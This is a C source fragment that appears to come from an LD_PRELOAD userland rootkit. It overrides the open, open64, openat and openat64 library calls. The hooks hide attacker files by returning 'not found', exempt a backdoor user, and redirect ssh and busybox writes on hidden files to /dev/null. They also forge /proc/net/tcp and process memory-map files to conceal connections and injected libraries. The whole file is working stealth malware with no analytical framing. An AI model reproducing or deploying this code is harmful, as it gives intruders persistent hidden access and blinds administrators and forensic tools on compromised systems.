#if defined(__GLIBC__) && (__GLIBC_MINOR__ < 26)
int open(const char *pathname, int flags, mode_t mode){
	hook(COPEN);
	if(is_bdusr())
		return (long)call(COPEN, pathname, flags, mode);
	if(hidden_path(pathname) && ((process("ssh") || process("busybox")) && (flags == (64|1|512))))
		return (long)call(COPEN, "/dev/null", flags, mode);
	if(hidden_path(pathname)){
		errno = ENOENT;
		return -1;
	}
	if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
		return fileno(forge_procnet(pathname));
	if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME))
		return fileno(forge_maps(pathname));
	if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME))
		return fileno(forge_smaps(pathname));
	if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME))
		return fileno(forge_numamaps(pathname));
	char cwd[PROCPATH_MAXLEN];
	if(getcwd(cwd, sizeof(cwd)) != NULL){
		if(!strcmp(cwd, "/proc")){
			if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME))
				return fileno(forge_maps(pathname));
			if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME))
				return fileno(forge_smaps(pathname));
			if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME))
				return fileno(forge_numamaps(pathname));
		}
		if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
			if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME))
				return fileno(forge_maps(pathname));
			if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME))
				return fileno(forge_smaps(pathname));
			if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME))
				return fileno(forge_numamaps(pathname));
		}
	}
	return (long)call(COPEN, pathname, flags, mode);
}

int open64(const char *pathname, int flags, mode_t mode){
	hook(COPEN64);
	if(is_bdusr())
		return (long)call(COPEN64, pathname, flags, mode);
	if(hidden_path64(pathname) && ((process("ssh") || process("busybox")) && (flags == (64|1|512))))
       		return (long)call(COPEN64, "/dev/null", flags, mode);
	if(hidden_path64(pathname)){
		errno = ENOENT;
		return -1;
	}
	if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
		return fileno(forge_procnet(pathname));
	if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME))
		return fileno(forge_maps(pathname));
	if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME))
		return fileno(forge_smaps(pathname));
	if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME))
		return fileno(forge_numamaps(pathname));
	char cwd[PROCPATH_MAXLEN];
	if(getcwd(cwd, sizeof(cwd)) != NULL){
		if(!strcmp(cwd, "/proc")){
			if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME))
				return fileno(forge_maps(pathname));
			if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME))
				return fileno(forge_smaps(pathname));
			if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME))
				return fileno(forge_numamaps(pathname));
		}
		if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
			if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME))
				return fileno(forge_maps(pathname));
			if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME))
				return fileno(forge_smaps(pathname));
			if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME))
				return fileno(forge_numamaps(pathname));
		}
	}
	return (long)call(COPEN64, pathname, flags, mode);
}
#endif
int openat(int fd, const char *pathname, int flags, mode_t mode){
        hook(COPENAT);
	if(is_bdusr())
		return (long)call(COPENAT, fd, pathname, flags, mode);
	if((hidden_path(pathname) || hidden_fd(fd)) && ((process("ssh") || process("busybox")) && (flags == (64|1|512))))
		return (long)call(COPENAT, fd, "/dev/null", flags, mode);
	if(pathname){
		if(hidden_path(pathname)){
			errno = ENOENT;
			return -1;
		}
		if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
			return fileno(forge_procnet(pathname));
		if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME))
		return fileno(forge_maps(pathname));
		if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME))
			return fileno(forge_smaps(pathname));
		if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME))
			return fileno(forge_numamaps(pathname));
		char cwd[PROCPATH_MAXLEN];
		if(getcwd(cwd, sizeof(cwd)) != NULL){
			if(!strcmp(cwd, "/proc")){
				if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME))
					return fileno(forge_maps(pathname));
				if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME))
						return fileno(forge_smaps(pathname));
				if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME))
					return fileno(forge_numamaps(pathname));
			}
			if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
				if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME))
					return fileno(forge_maps(pathname));
				if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME))
					return fileno(forge_smaps(pathname));
				if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME))
					return fileno(forge_numamaps(pathname));
			}
		}
	}
	return (long)call(COPENAT, fd, pathname, flags, mode);
}

int openat64(int fd, const char *pathname, int flags, mode_t mode){
	hook(COPENAT64);
	if(is_bdusr())
		return (long)call(COPENAT64, fd, pathname, flags, mode);
	if((hidden_path64(pathname) || hidden_fd64(fd)) && ((process("ssh") || process("busybox")) && (flags == (64|1|512))))
		return (long)call(COPENAT64, fd, "/dev/null", flags, mode);
	if(pathname){
		if(hidden_path64(pathname)){
			errno = ENOENT;
			return -1;
		}
		if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
			return fileno(forge_procnet(pathname));
		if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME))
			return fileno(forge_maps(pathname));
		if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME))
			return fileno(forge_smaps(pathname));
		if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME))
			return fileno(forge_numamaps(pathname));
		char cwd[PROCPATH_MAXLEN];
		if(getcwd(cwd, sizeof(cwd)) != NULL){
			if(!strcmp(cwd, "/proc")){
				if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME))
					return fileno(forge_maps(pathname));
				if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME))
					return fileno(forge_smaps(pathname));
				if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME))
					return fileno(forge_numamaps(pathname));
	                }
			if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
				if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME))
					return fileno(forge_maps(pathname));
				if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME))
					return fileno(forge_smaps(pathname));
				if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME))
					return fileno(forge_numamaps(pathname));
			}
		}
	}
	return (long)call(COPENAT64, fd, pathname, flags, mode);
}
